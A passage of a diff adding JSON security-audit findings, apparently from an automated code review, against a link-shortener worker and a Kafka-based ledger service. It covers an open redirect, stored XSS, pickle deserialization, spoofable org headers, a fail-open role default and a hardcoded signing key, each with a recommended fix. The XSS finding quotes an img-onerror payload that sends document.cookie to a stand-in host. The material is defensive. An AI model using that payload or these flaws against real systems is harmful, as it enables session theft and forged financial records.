+          "rule": "FP-13",
+          "answer": "DOES_NOT_HOLD",
+          "reason": "mantis-review negative constraint 13 (verify_attacker_control_of_source); answer HOLDS = the disqualifying condition fires (mantis FAIL), DOES_NOT_HOLD = constraint satisfied (mantis PASS). Ingress cited: the inbound Request headers at index.ts:105, copied wholesale into the forwarded Request."
+        },
+        {
+          "rule": "FP-01",
+          "answer": "DOES_NOT_HOLD",
+          "reason": "mantis-review negative constraint 1 (ignore_hypothetical_misuse); answer HOLDS = the disqualifying condition fires (mantis FAIL), DOES_NOT_HOLD = constraint satisfied (mantis PASS). LinkStore is not misusing a safe API; the router is failing to enforce the contract LinkStore documents and depends on."
+        },
+        {
+          "rule": "FP-09",
+          "answer": "DOES_NOT_HOLD",
+          "reason": "mantis-review negative constraint 9 (verify_mitigations_pragmatically); answer HOLDS = the disqualifying condition fires (mantis FAIL), DOES_NOT_HOLD = constraint satisfied (mantis PASS). There is no mitigation to credit on this branch - no header removal, no allowlist, no re-derivation."
+        }
+      ]
+    },
+    {
+      "title": "Unauthenticated open redirect through the ?to= inline destination on /go/",
+      "location": {
+        "path": "edge-links/src/handlers/go.ts",
+        "symbol": "redirect",
+        "line": 26
+      },
+      "class": "Open redirect",
+      "severity": "medium",
+      "status": "confirmed",
+      "evidence": "`const inline = url.searchParams.get('to'); if (inline) return Response.redirect(inline, 302);` - the value is used as the Location target with no scheme check, no host allowlist and no comparison against LINK_BASE. The /go/ branch is dispatched at index.ts:90-92, before authenticate() runs at line 94, so the handler is reachable without any credential. Contrast handlers/go.ts:47, where the preview endpoint does enforce https + ALLOWED_PREVIEW_HOSTS - the same file knows how to validate a URL.",
+      "impact": "The link-shortener domain (lnk.example.com) will 302 any visitor to any attacker-chosen URL, which is precisely the trust the domain exists to lend. Usable for credential phishing, for laundering malicious destinations past mail/chat scanners that allowlist the shortener, and for stripping Referer control in OAuth-style flows that treat the shortener host as safe.",
+      "recommendation": "Validate the inline destination the same way preview() validates its input: parse it, require https, and check the hostname against an allowlist (or require the destination to be persisted and referenced by slug, which is what the rest of the handler does).",
+      "triage": [
+        {
+          "rule": "FP-12",
+          "answer": "DOES_NOT_HOLD",
+          "reason": "mantis-review negative constraint 12 (ensure_source_code_coherence); answer HOLDS = the disqualifying condition fires (mantis FAIL), DOES_NOT_HOLD = constraint satisfied (mantis PASS). go.ts:24-27 verified; dispatch order verified at index.ts:82-94."
+        },
+        {
+          "rule": "FP-13",
+          "answer": "DOES_NOT_HOLD",
+          "reason": "mantis-review negative constraint 13 (verify_attacker_control_of_source); answer HOLDS = the disqualifying condition fires (mantis FAIL), DOES_NOT_HOLD = constraint satisfied (mantis PASS). Ingress cited: `url.searchParams.get('to')` at go.ts:24 - an unauthenticated query-string value reaching the Location header."
+        },
+        {
+          "rule": "FP-09",
+          "answer": "DOES_NOT_HOLD",
+          "reason": "mantis-review negative constraint 9 (verify_mitigations_pragmatically); answer HOLDS = the disqualifying condition fires (mantis FAIL), DOES_NOT_HOLD = constraint satisfied (mantis PASS). No mitigation exists on this branch; the allowlist in the same file guards a different function (preview)."
+        },
+        {
+          "rule": "FP-02",
+          "answer": "DOES_NOT_HOLD",
+          "reason": "mantis-review negative constraint 2 (ignore_missing_hygiene); answer HOLDS = the disqualifying condition fires (mantis FAIL), DOES_NOT_HOLD = constraint satisfied (mantis PASS). An unvalidated redirect target is a distinct flaw class (CWE-601), not a missing security header."
+        }
+      ]
+    },
+    {
+      "title": "Queue import path writes link fields to storage without parseLinkInput, producing stored XSS in the rendered list",
+      "location": {
+        "path": "edge-links/src/queue.ts",
+        "symbol": "handleQueue",
+        "line": 32
+      },
+      "class": "Stored cross-site scripting",
+      "severity": "high",
+      "status": "confirmed",
+      "evidence": "render.ts:11-12 states 'Fields arrive from the store already escaped by the API layer, so they can be dropped straight into the markup', and linkCard interpolates target, title and slug into HTML with no escaping at render time (render.ts:16-18). The HTTP path honours that contract: createLink calls parseLinkInput, which validates the slug against SLUG_RE, bounds the target, and runs escapeHtml over target and title (handlers/links.ts:27-53). handleQueue bypasses it entirely - it JSON.stringifies row.slug / row.target / row.title straight into the DO's /put body (queue.ts:32-37), which persists them as-is (do/LinkStore.ts:41-42). GET /api/links then renders them through linkListPage (index.ts:123).",
+      "impact": "A row whose title is `</a><img src=x onerror=fetch('//evil/'+document.cookie)>` is stored verbatim and executes in the dashboard origin for every workspace member who opens the link list. Because the same path also skips SLUG_RE and the 2048-character target bound, it can additionally write keys and destinations the HTTP API would reject.",
+      "recommendation": "Call parseLinkInput(row, row.owner) inside handleQueue and reject the message (or dead-letter it) on throw, so both ingresses share one validator. Independently, stop relying on escape-on-write: escape in linkCard at render time so a future third ingress cannot reintroduce this.",
+      "triage": [
+        {
+          "rule": "FP-12",
+          "answer": "DOES_NOT_HOLD",
+          "reason": "mantis-review negative constraint 12 (ensure_source_code_coherence); answer HOLDS = the disqualifying condition fires (mantis FAIL), DOES_NOT_HOLD = constraint satisfied (mantis PASS). Both paths read directly: queue.ts:26-38 (no validation) vs handlers/links.ts:60-79 (validation); sink at render.ts:13-21."
+        },
+        {
+          "rule": "FP-13",
+          "answer": "DOES_NOT_HOLD",
+          "reason": "mantis-review negative constraint 13 (verify_attacker_control_of_source); answer HOLDS = the disqualifying condition fires (mantis FAIL), DOES_NOT_HOLD = constraint satisfied (mantis PASS). Ingress cited: `message.body` at queue.ts:21 - the Cloudflare Queue consumer boundary. The module's own comment says rows are 'produced by the dashboard importer, which pushes one message per parsed row' of a user-supplied CSV; the producer is outside this repo, so the queue boundary is the trusted-side ingress point this rule asks for."
+        },
+        {
+          "rule": "FP-06",
+          "answer": "DOES_NOT_HOLD",
+          "reason": "mantis-review negative constraint 6 (evaluate_questionable_file_paths); answer HOLDS = the disqualifying condition fires (mantis FAIL), DOES_NOT_HOLD = constraint satisfied (mantis PASS). queue.ts is production code wired to the `queue()` export at index.ts:133-135 and to the [[queues.consumers]] binding in wrangler.toml:25-28."
+        },
+        {
+          "rule": "FP-01",
+          "answer": "DOES_NOT_HOLD",
+          "reason": "mantis-review negative constraint 1 (ignore_hypothetical_misuse); answer HOLDS = the disqualifying condition fires (mantis FAIL), DOES_NOT_HOLD = constraint satisfied (mantis PASS). The omission is in handleQueue itself, not in a hypothetical caller of parseLinkInput."
+        }
+      ]
+    },
+    {
+      "title": "Queue consumer selects the target Durable Object from the message body's owner field",
+      "location": {
+        "path": "edge-links/src/queue.ts",
+        "symbol": "handleQueue",
+        "line": 23
+      },
+      "class": "Broken access control",
+      "severity": "medium",
+      "status": "probable",
+      "evidence": "`const id = env.LINK_STORE.idFromName(row.owner)` - the workspace whose store is written is taken from the message, and the write is then authorised with a hardcoded `X-Actor-Scopes: links:write` (queue.ts:30). The HTTP path derives the same instance id from the authenticated session instead (`env.LINK_STORE.idFromName(session.owner)`, index.ts:99), and LinkStore's own comment states 'The router derives the instance id from the authenticated workspace, so an instance only ever holds one tenant's links' (do/LinkStore.ts:4-6) - an invariant this path does not maintain.",
+      "impact": "Any producer that can place a message on the link-imports queue writes into an arbitrary workspace's store with write scope, breaking the per-workspace isolation the Durable Object model is built on. Whether an end user can influence `owner` depends on the dashboard importer, which is not in this repository - hence probable rather than confirmed.",
+      "recommendation": "Bind the workspace to the message at enqueue time in a way the consumer can verify (sign the row, or carry the owner in a signed envelope), and have the consumer reject any row whose owner does not match. At minimum, validate that owner matches the pallet/import job the message belongs to.",
+      "triage": [
+        {
+          "rule": "FP-12",
+          "answer": "DOES_NOT_HOLD",
+          "reason": "mantis-review negative constraint 12 (ensure_source_code_coherence); answer HOLDS = the disqualifying condition fires (mantis FAIL), DOES_NOT_HOLD = constraint satisfied (mantis PASS). queue.ts:23-31 verified against index.ts:99 and do/LinkStore.ts:4-6."
+        },
+        {
+          "rule": "FP-13",
+          "answer": "UNKNOWN",
+          "reason": "mantis-review negative constraint 13 (verify_attacker_control_of_source); answer HOLDS = the disqualifying condition fires (mantis FAIL), DOES_NOT_HOLD = constraint satisfied (mantis PASS). The queue boundary at queue.ts:21 is the ingress, but no producer exists in this tree (the IMPORTS binding at index.ts:17 and wrangler.toml:31 is declared and never used), so attacker control of the `owner` field specifically could not be traced to a user-supplied value."
+        },
+        {
+          "rule": "FP-01",
+          "answer": "DOES_NOT_HOLD",
+          "reason": "mantis-review negative constraint 1 (ignore_hypothetical_misuse); answer HOLDS = the disqualifying condition fires (mantis FAIL), DOES_NOT_HOLD = constraint satisfied (mantis PASS). The unchecked trust decision is made in handleQueue itself."
+        }
+      ]
+    },
+    {
+      "title": "scopesFor defaults a missing role to owner, granting links:admin to any token without a role claim",
+      "location": {
+        "path": "edge-links/src/roles.ts",
+        "symbol": "scopesFor",
+        "line": 14
+      },
+      "class": "Privilege escalation",
+      "severity": "medium",
+      "status": "confirmed",
+      "evidence": "`export function scopesFor(role: string = \"owner\") { return ROLE_SCOPES[role] ?? ROLE_SCOPES.viewer; }`. The default parameter fires when role is undefined, so the function fails OPEN to the owner set, while an unrecognised role string fails CLOSED to viewer - the two branches disagree about which direction is safe. authenticate() calls scopesFor(claims.role) (auth.ts:76) with the raw claim, and issueToken writes `role: meta?.role` (index.ts:59), which JSON.stringify omits entirely when the ws-meta record is missing or carries no role. Micro-harness: scopesFor(undefined) returns ['links:read','links:write','links:delete','links:admin'] while scopesFor('bogus') returns ['links:read'].",
+      "impact": "Any workspace whose ws-meta KV entry is absent or roleless - the exact 'created before the roles migration' case the comment describes - mints tokens that carry every capability, including links:delete and links:admin, and hasScope() treats links:admin as a wildcard over every other scope (roles.ts:19).",
+      "recommendation": "Fail closed: `export function scopesFor(role?: string) { return ROLE_SCOPES[role ?? ''] ?? ROLE_SCOPES.viewer; }`. Backfill ws-meta for legacy workspaces explicitly rather than encoding the migration as a default argument.",
+      "triage": [
+        {
+          "rule": "FP-12",
+          "answer": "DOES_NOT_HOLD",
+          "reason": "mantis-review negative constraint 12 (ensure_source_code_coherence); answer HOLDS = the disqualifying condition fires (mantis FAIL), DOES_NOT_HOLD = constraint satisfied (mantis PASS). roles.ts:14-16 verified; call sites at auth.ts:76 and handlers/links.ts:60; token minting at index.ts:59."
+        },
+        {
+          "rule": "FP-13",
+          "answer": "DOES_NOT_HOLD",
+          "reason": "mantis-review negative constraint 13 (verify_attacker_control_of_source); answer HOLDS = the disqualifying condition fires (mantis FAIL), DOES_NOT_HOLD = constraint satisfied (mantis PASS). Ingress cited: the `role` claim of the bearer token parsed at auth.ts:75 - an attacker who obtains a token for a legacy workspace (index.ts:38-75, gated only on the workspace secret) receives one with no role claim."
+        },
+        {
+          "rule": "FP-01",
+          "answer": "DOES_NOT_HOLD",
+          "reason": "mantis-review negative constraint 1 (ignore_hypothetical_misuse); answer HOLDS = the disqualifying condition fires (mantis FAIL), DOES_NOT_HOLD = constraint satisfied (mantis PASS). The default is inside scopesFor; callers pass exactly what the token contains."
+        },
+        {
+          "rule": "FP-02",
+          "answer": "DOES_NOT_HOLD",
+          "reason": "mantis-review negative constraint 2 (ignore_missing_hygiene); answer HOLDS = the disqualifying condition fires (mantis FAIL), DOES_NOT_HOLD = constraint satisfied (mantis PASS). This is the capability-resolution function, not a defence-in-depth extra."
+        }
+      ]
+    },
+    {
+      "title": "Kafka trace-context header is deserialised with pickle.loads before any signature check",
+      "location": {
+        "path": "ledger-stream/common/serde.py",
+        "symbol": "decode_context",
+        "line": 27
+      },
+      "class": "Insecure deserialization",
+      "severity": "high",
+      "status": "confirmed",
+      "evidence": "decode_context() runs `pickle.loads(value)` over the raw bytes of the x-ctx header of any consumed message. consumer.py:51 calls it on every message - after decode_value but before apply_transfer, which is where the HMAC check lives (apply.py:42). The signature itself would not help: sign() covers only the message value (app.py:53, `sign(value)`), never the headers, so x-ctx is unauthenticated even on topics whose policy sets require_signature=True. The consumer subscribes to the pattern ^ledger\\..* (topics.py:46, consumer.py:67), so any topic in that namespace delivers here.",
+      "impact": "Remote code execution in the ledger worker as whatever user it runs as, from a single crafted message header. pickle.loads instantiates arbitrary objects via __reduce__; there is no allowlist, no length bound and no try/except around it in decode_context. The worker holds the sqlite ledger and the LEDGER_SIGNING_KEY, so compromise also yields the ability to forge signed messages.",
+      "recommendation": "Replace pickle with a data-only codec for the context header - json.loads over a bounded byte string, or the W3C traceparent format the header is imitating. If a binary codec is required, cover the headers with the HMAC and verify before decoding. pickle should not appear on any path that touches network input.",
+      "triage": [
+        {
+          "rule": "FP-12",
+          "answer": "DOES_NOT_HOLD",
+          "reason": "mantis-review negative constraint 12 (ensure_source_code_coherence); answer HOLDS = the disqualifying condition fires (mantis FAIL), DOES_NOT_HOLD = constraint satisfied (mantis PASS). serde.py:18-28 (pickle.dumps/loads) and consumer.py:51 verified; sign() input verified at app.py:47-53."
+        },
+        {
+          "rule": "FP-13",
+          "answer": "DOES_NOT_HOLD",
+          "reason": "mantis-review negative constraint 13 (verify_attacker_control_of_source); answer HOLDS = the disqualifying condition fires (mantis FAIL), DOES_NOT_HOLD = constraint satisfied (mantis PASS). Ingress cited: `msg.headers()` at consumer.py:40, passed to decode_context at line 51. The Kafka topic namespace is the trust boundary; anything with produce rights on ledger.* is untrusted per the module's own admin-topic gate at consumer.py:43."
+        },
+        {
+          "rule": "FP-08",
+          "answer": "DOES_NOT_HOLD",
+          "reason": "mantis-review negative constraint 8 (intrinsic_security_flaws); answer HOLDS = the disqualifying condition fires (mantis FAIL), DOES_NOT_HOLD = constraint satisfied (mantis PASS). This rule would keep the finding valid even with no caller; it does have one."
+        },
+        {
+          "rule": "FP-03",
+          "answer": "DOES_NOT_HOLD",
+          "reason": "mantis-review negative constraint 3 (require_strict_reproducibility); answer HOLDS = the disqualifying condition fires (mantis FAIL), DOES_NOT_HOLD = constraint satisfied (mantis PASS). Deterministic single-message trigger; no timing or grooming involved."
+        }
+      ]
+    },
+    {
+      "title": "Unknown ledger.* topics inherit OPEN_POLICY, which disables signature checks and permits cross-org account override",
+      "location": {
+        "path": "ledger-stream/common/topics.py",
+        "symbol": "OPEN_POLICY",
+        "line": 21
+      },
+      "class": "Fail-open policy default",
+      "severity": "high",
+      "status": "confirmed",
+      "evidence": "policy_for() returns OPEN_POLICY for any topic absent from TOPIC_POLICY (topics.py:49-50). OPEN_POLICY is TopicPolicy(require_signature=False, max_amount_cents=10_000_000, allow_account_override=True) - it turns off the HMAC check at apply.py:42, raises the per-message ceiling 20x above ledger.transfers.v2's 500_000, and disables the account-ownership check at apply.py:51. The comment 'Most new streams are internal fan-out of already-validated events, so they inherit the relaxed profile' is the rationale. SUBSCRIPTION_PATTERN ^ledger\\..* means a new topic is consumed the moment it exists, with no deploy, so the relaxed profile is reachable by creating a topic name rather than by editing this file.",
+      "impact": "Anyone able to produce to a ledger.* topic that has no explicit policy entry can post unsigned ledger entries of up to 10,000,000 cents against any account_id in any org - the ownership check that would normally reject `account X does not belong to Y` is switched off by the same default. The only remaining brake is DAILY_ACCOUNT_LIMIT_CENTS (apply.py:15).",
+      "recommendation": "Invert the default: policy_for() should return a closed policy (require_signature=True, allow_account_override=False, a low ceiling) for unknown topics, or refuse the message outright. Pair it with an explicit subscription list, or keep the pattern but reject topics with no registered policy.",
+      "triage": [
+        {
+          "rule": "FP-12",
+          "answer": "DOES_NOT_HOLD",
+          "reason": "mantis-review negative constraint 12 (ensure_source_code_coherence); answer HOLDS = the disqualifying condition fires (mantis FAIL), DOES_NOT_HOLD = constraint satisfied (mantis PASS). topics.py:21-25, 46, 49-50 verified; all three fields consumed at apply.py:42/46/51."
+        },
+        {
+          "rule": "FP-13",
+          "answer": "DOES_NOT_HOLD",
+          "reason": "mantis-review negative constraint 13 (verify_attacker_control_of_source); answer HOLDS = the disqualifying condition fires (mantis FAIL), DOES_NOT_HOLD = constraint satisfied (mantis PASS). Ingress cited: `msg.topic()` at consumer.py:39 and the message value at consumer.py:48 - both chosen by the producer."
+        },
+        {
+          "rule": "FP-01",
+          "answer": "DOES_NOT_HOLD",
+          "reason": "mantis-review negative constraint 1 (ignore_hypothetical_misuse); answer HOLDS = the disqualifying condition fires (mantis FAIL), DOES_NOT_HOLD = constraint satisfied (mantis PASS). policy_for's fallback is the defect; callers use it exactly as documented."
+        },
+        {
+          "rule": "FP-02",
+          "answer": "DOES_NOT_HOLD",
+          "reason": "mantis-review negative constraint 2 (ignore_missing_hygiene); answer HOLDS = the disqualifying condition fires (mantis FAIL), DOES_NOT_HOLD = constraint satisfied (mantis PASS). Signature verification and cross-org ownership are the primary controls on this path, not defence-in-depth."
+        }
+      ]
+    },
+    {
+      "title": "Producer org identity is read from the unsigned x-org header and used for the admin-topic and account-ownership gates",
+      "location": {
+        "path": "ledger-stream/worker/consumer.py",
+        "symbol": "handle_message",
+        "line": 43
+      },
+      "class": "Spoofable identity / broken access control",
+      "severity": "high",
+      "status": "confirmed",
+      "evidence": "`org_id = header_value(headers, 'x-org')` (line 41) is the only source of caller identity. It gates the operator streams - `if is_admin_topic(topic) and org_id not in PLATFORM_ORGS: return` (line 43, with PLATFORM_ORGS = {'org_platform','org_treasury'}) - and is passed as consumer_org to apply_transfer (line 60), where it is the value the account-ownership check compares against (apply.py:51-52). The HMAC covers only the message value (app.py:53, common/signing.py:13), so headers carry no integrity protection at all; a producer sets x-org to any string it likes.",
+      "impact": "The PLATFORM_ORGS gate on ledger.admin.* is bypassed by sending `x-org: org_platform`, unlocking ledger.admin.adjustments.v1's 100,000,000-cent ceiling and allow_account_override=True. Independently, the cross-org ownership check on ordinary transfer topics is defeated by claiming the victim's org, so entries can be posted against accounts belonging to another tenant.",
+      "recommendation": "Bind the org to the signed payload rather than a header: include org_id in the value that sign() covers and read it from the verified payload, or move to per-producer Kafka SASL identities and derive the org from the authenticated principal. Extend the HMAC to cover the headers if they must carry authority.",
+      "triage": [
+        {
+          "rule": "FP-12",
+          "answer": "DOES_NOT_HOLD",
+          "reason": "mantis-review negative constraint 12 (ensure_source_code_coherence); answer HOLDS = the disqualifying condition fires (mantis FAIL), DOES_NOT_HOLD = constraint satisfied (mantis PASS). consumer.py:41-43 and 54-61 verified; signature input verified at api/app.py:47-56; ownership check at worker/apply.py:49-52."
+        },
+        {
+          "rule": "FP-13",
+          "answer": "DOES_NOT_HOLD",
+          "reason": "mantis-review negative constraint 13 (verify_attacker_control_of_source); answer HOLDS = the disqualifying condition fires (mantis FAIL), DOES_NOT_HOLD = constraint satisfied (mantis PASS). Ingress cited: `msg.headers()` at consumer.py:40 -> header_value(headers,'x-org') at line 41. Producer-set, unsigned."
+        },
+        {
+          "rule": "FP-09",
+          "answer": "DOES_NOT_HOLD",
+          "reason": "mantis-review negative constraint 9 (verify_mitigations_pragmatically); answer HOLDS = the disqualifying condition fires (mantis FAIL), DOES_NOT_HOLD = constraint satisfied (mantis PASS). The HMAC is a real mitigation but its coverage was checked and demonstrably excludes headers, so crediting it here would be unwarranted."
+        },
+        {
+          "rule": "FP-02",
+          "answer": "DOES_NOT_HOLD",
+          "reason": "mantis-review negative constraint 2 (ignore_missing_hygiene); answer HOLDS = the disqualifying condition fires (mantis FAIL), DOES_NOT_HOLD = constraint satisfied (mantis PASS). This is the sole authorisation input on the consumer path."
+        }
+      ]
+    },
+    {
+      "title": "DLQ replay applies messages with signature verification disabled and selects its policy from an attacker-controlled header",
+      "location": {
+        "path": "ledger-stream/worker/retry.py",
+        "symbol": "replay_one",
+        "line": 55
+      },
+      "class": "Authentication bypass / policy bypass",
+      "severity": "high",
+      "status": "confirmed",
+      "evidence": "replay_one calls apply_transfer(..., verify_signature=False) (line 55), which short-circuits the HMAC check at apply.py:42 regardless of the topic policy. The policy it applies is policy_for(original_topic) where original_topic = header_value(headers, 'x-original-topic') (line 38) - an unsigned, producer-set header. consumer_org likewise comes from the unsigned x-org header (line 54). None of the checks consumer.py performs are repeated here: there is no is_admin_topic / PLATFORM_ORGS gate on this path. The justification comment ('They were already accepted by the intake service and checked by the main consumer before being parked') assumes messages on ledger.dlq.v1 can only have been put there by this system; nothing enforces that, and no code in this tree produces to the DLQ.",
+      "impact": "A message placed on ledger.dlq.v1 with `x-original-topic: ledger.admin.adjustments.v1` is applied with that topic's 100,000,000-cent ceiling and allow_account_override=True, with no signature and no platform-org check - an arbitrary, unsigned, cross-org ledger write of up to a million dollars per message, capped only by DAILY_ACCOUNT_LIMIT_CENTS.",
+      "recommendation": "Never disable verification on replay. Re-sign messages when they are parked (or park the original signed bytes and verify them on the way out), take original_topic from a signed field, and re-apply the admin-topic gate on the retry path.",
+      "triage": [
+        {
+          "rule": "FP-12",
+          "answer": "DOES_NOT_HOLD",
+          "reason": "mantis-review negative constraint 12 (ensure_source_code_coherence); answer HOLDS = the disqualifying condition fires (mantis FAIL), DOES_NOT_HOLD = constraint satisfied (mantis PASS). retry.py:36-56 verified; the verify_signature parameter and its effect verified at apply.py:38/42; the absent admin gate confirmed by comparison with consumer.py:43."
+        },
+        {
+          "rule": "FP-13",
+          "answer": "DOES_NOT_HOLD",
+          "reason": "mantis-review negative constraint 13 (verify_attacker_control_of_source); answer HOLDS = the disqualifying condition fires (mantis FAIL), DOES_NOT_HOLD = constraint satisfied (mantis PASS). Ingress cited: `msg.headers()` / `msg.value()` at retry.py:37/44 for messages on ledger.dlq.v1. Same Kafka produce-rights trust boundary the module already treats as untrusted elsewhere."
+        },
+        {
+          "rule": "FP-01",
+          "answer": "DOES_NOT_HOLD",
+          "reason": "mantis-review negative constraint 1 (ignore_hypothetical_misuse); answer HOLDS = the disqualifying condition fires (mantis FAIL), DOES_NOT_HOLD = constraint satisfied (mantis PASS). apply_transfer behaves correctly; replay_one is the caller that deliberately turns its check off, and replay_one is production code with its own entry point (run())."
+        },
+        {
+          "rule": "FP-05",
+          "answer": "DOES_NOT_HOLD",
+          "reason": "mantis-review negative constraint 5 (no_security_flaw_stretching); answer HOLDS = the disqualifying condition fires (mantis FAIL), DOES_NOT_HOLD = constraint satisfied (mantis PASS). No mitigation is being stretched past its purpose - the finding is that the mitigation is explicitly switched off on this path."
+        }
+      ]
+    },
+    {
+      "title": "Message signing key falls back to a hardcoded default when LEDGER_SIGNING_KEY is unset",
+      "location": {
+        "path": "ledger-stream/common/signing.py",
+        "symbol": "SIGNING_KEY",
+        "line": 8
+      },
+      "class": "Hardcoded credential",
+      "severity": "medium",
+      "status": "confirmed",
+      "evidence": "`DEFAULT_SIGNING_KEY = \"ledger-stream-dev-signing-key\"` and `SIGNING_KEY = os.environ.get(\"LEDGER_SIGNING_KEY\", DEFAULT_SIGNING_KEY)` - the module imports cleanly and signs with the literal whenever the variable is missing. There is no assertion, no environment check and no startup failure; the only signal is the comment '#: Overridden per environment by the deploy manifest'. sign() and verify() (lines 13-22) are the entire integrity story for ledger.transfers.v2, ledger.holds.v1 and ledger.admin.adjustments.v1, all of which set require_signature=True.",
+      "impact": "In any environment where the variable is not set, every x-sig header is computable by anyone with the source, so require_signature=True provides no protection: forged messages on the signed topics - including ledger.admin.adjustments.v1 with its 100,000,000-cent ceiling - verify successfully.",
+      "recommendation": "Fail closed at import or at build_app()/run() time: raise if LEDGER_SIGNING_KEY is unset, exactly as fleet-provision's Config.from does with `require(secret.isNotBlank())`. Remove the literal from the source tree.",
+      "triage": [
+        {
+          "rule": "FP-08",
+          "answer": "DOES_NOT_HOLD",
+          "reason": "mantis-review negative constraint 8 (intrinsic_security_flaws); answer HOLDS = the disqualifying condition fires (mantis FAIL), DOES_NOT_HOLD = constraint satisfied (mantis PASS). This rule is the reason the finding stands: a hardcoded static secret is valid on its own terms, and here it is additionally live on the default path."
+        },
+        {
+          "rule": "FP-12",
+          "answer": "DOES_NOT_HOLD",
+          "reason": "mantis-review negative constraint 12 (ensure_source_code_coherence); answer HOLDS = the disqualifying condition fires (mantis FAIL), DOES_NOT_HOLD = constraint satisfied (mantis PASS). signing.py:8-10 verified; consumers at worker/apply.py:42 and api/app.py:53."
+        },
+        {
+          "rule": "FP-13",
+          "answer": "NOT_APPLICABLE",
+          "reason": "mantis-review negative constraint 13 (verify_attacker_control_of_source); answer HOLDS = the disqualifying condition fires (mantis FAIL), DOES_NOT_HOLD = constraint satisfied (mantis PASS). Rule 08 explicitly exempts intrinsic flaws from the trust-boundary tracing requirement; there is no tainted data flow to trace - the secret is a constant."
+        },
+        {
+          "rule": "FP-02",
+          "answer": "DOES_NOT_HOLD",
+          "reason": "mantis-review negative constraint 2 (ignore_missing_hygiene); answer HOLDS = the disqualifying condition fires (mantis FAIL), DOES_NOT_HOLD = constraint satisfied (mantis PASS). Not a mock database or a test fixture: this key is used by the production sign/verify path."
+        }
+      ]
+    },
+    {
+      "title": "Client-supplied idempotency_key becomes the ledger primary key on an INSERT OR REPLACE",
+      "location": {
+        "path": "ledger-stream/worker/apply.py",
+        "symbol": "apply_transfer",
+        "line": 59
+      },
+      "class": "Data tampering / broken idempotency",
+      "severity": "high",
+      "status": "confirmed",
+      "evidence": "The entry id is `str(payload.get('idempotency_key') or uuid.uuid4())` and store.post_entry writes it with `INSERT OR REPLACE INTO entries VALUES (...)` (store.py:65) against `id TEXT PRIMARY KEY` (store.py:9). idempotency_key is a free-form client field: TransferRequest declares it as Optional[str] with only max_length=64 and no pattern, uniqueness or namespacing (api/schemas.py:24). So a colliding key does not make the operation idempotent - it destroys and replaces the previously stored row, including its account_id, org_id, direction and amount.",
+      "impact": "Any client can overwrite an existing ledger entry it does not own by reusing that entry's id. No guessing is needed for the common case: two tenants independently using a natural key such as `inv-1001` collide, and the later transfer silently overwrites the earlier one - a financial record is destroyed and re-attributed to a different account and org, with no audit trail and no error returned.",
+      "recommendation": "Namespace the key (`f\"{org_id}:{idempotency_key}\"`) so it cannot collide across tenants, and change the write to `INSERT ... ON CONFLICT(id) DO NOTHING` so a replay is a no-op rather than an overwrite. Return the existing entry id on conflict.",
+      "triage": [
+        {
+          "rule": "FP-12",
+          "answer": "DOES_NOT_HOLD",
+          "reason": "mantis-review negative constraint 12 (ensure_source_code_coherence); answer HOLDS = the disqualifying condition fires (mantis FAIL), DOES_NOT_HOLD = constraint satisfied (mantis PASS). apply.py:58-67, store.py:62-67 and the PRIMARY KEY declaration at store.py:9 verified; schema field at api/schemas.py:24."
+        },
+        {
+          "rule": "FP-13",
+          "answer": "DOES_NOT_HOLD",
+          "reason": "mantis-review negative constraint 13 (verify_attacker_control_of_source); answer HOLDS = the disqualifying condition fires (mantis FAIL), DOES_NOT_HOLD = constraint satisfied (mantis PASS). Ingress cited: `TransferRequest.idempotency_key` accepted at api/app.py:64 and carried into the published payload at app.py:69-71; also reachable directly from any producer via consumer.py:49."
+        },
+        {
+          "rule": "FP-01",
+          "answer": "DOES_NOT_HOLD",
+          "reason": "mantis-review negative constraint 1 (ignore_hypothetical_misuse); answer HOLDS = the disqualifying condition fires (mantis FAIL), DOES_NOT_HOLD = constraint satisfied (mantis PASS). post_entry's own docstring says callers are expected to have run the policy checks, but the REPLACE semantics are the store's own choice and apply_transfer is the intended caller."
+        },
+        {
+          "rule": "FP-03",
+          "answer": "DOES_NOT_HOLD",
+          "reason": "mantis-review negative constraint 3 (require_strict_reproducibility); answer HOLDS = the disqualifying condition fires (mantis FAIL), DOES_NOT_HOLD = constraint satisfied (mantis PASS). Deterministic: two messages with the same idempotency_key reproduce it with no timing dependency."
+        }
+      ]
+    },
+    {
+      "title": "Stored entry org_id is taken from the message payload rather than the verified consumer org",
+      "location": {
+        "path": "ledger-stream/worker/apply.py",
+        "symbol": "apply_transfer",
+        "line": 61
+      },
+      "class": "Broken access control",
+      "severity": "medium",
+      "status": "confirmed",
+      "evidence": "The ownership guard three lines earlier compares `store.account_org(account_id)` against consumer_org (apply.py:51), but the row that gets written uses `org_id=str(payload.get('org_id') or consumer_org)` - a different value, taken from the message body. Because store.account_org derives an account's owning org from previously stored rows (store.py:48-52), the payload field decides who owns the account from that point on. The guard is additionally skipped entirely while owning_org is empty (`and owning_org` at line 51), so the first entry ever written for an account_id sets its org with no check at all.",
+      "impact": "A producer can attribute ledger entries to an arbitrary org, and can claim any not-yet-seen account_id for an org of its choosing - after which the ownership check will defend the attacker's claim against the legitimate owner. The check and the write disagreeing about which value is authoritative means the guard can pass while the row it guards is written with different attribution.",
+      "recommendation": "Write org_id=consumer_org (the value that was actually checked) and reject any message whose payload org_id disagrees with it. Treat first-write-wins account claiming as an explicit provisioning step rather than a side effect of the empty-string branch.",
+      "triage": [
+        {
+          "rule": "FP-12",
+          "answer": "DOES_NOT_HOLD",
+          "reason": "mantis-review negative constraint 12 (ensure_source_code_coherence); answer HOLDS = the disqualifying condition fires (mantis FAIL), DOES_NOT_HOLD = constraint satisfied (mantis PASS). apply.py:49-61 and store.py:48-52 verified line by line."
+        },
+        {
+          "rule": "FP-13",
+          "answer": "DOES_NOT_HOLD",
+          "reason": "mantis-review negative constraint 13 (verify_attacker_control_of_source); answer HOLDS = the disqualifying condition fires (mantis FAIL), DOES_NOT_HOLD = constraint satisfied (mantis PASS). Ingress cited: the decoded message payload at consumer.py:49 (`decode_value(raw)`), whose org_id field is set by the producer; the intake service also stamps it at api/app.py:70 but the consumer never re-derives it."
+        },
+        {
+          "rule": "FP-01",
+          "answer": "DOES_NOT_HOLD",
+          "reason": "mantis-review negative constraint 1 (ignore_hypothetical_misuse); answer HOLDS = the disqualifying condition fires (mantis FAIL), DOES_NOT_HOLD = constraint satisfied (mantis PASS). The mismatch between the checked value and the written value is inside apply_transfer."
+        }
+      ]
+    },
+    {
+      "title": "Settlement backfill lets the CSV choose entry ids and org ids, overwriting existing ledger rows",
+      "location": {
+        "path": "ledger-stream/admin/backfill.py",
+        "symbol": "rows_from",
+        "line": 38
+      },
+      "class": "Data tampering",
+      "severity": "medium",
+      "status": "probable",
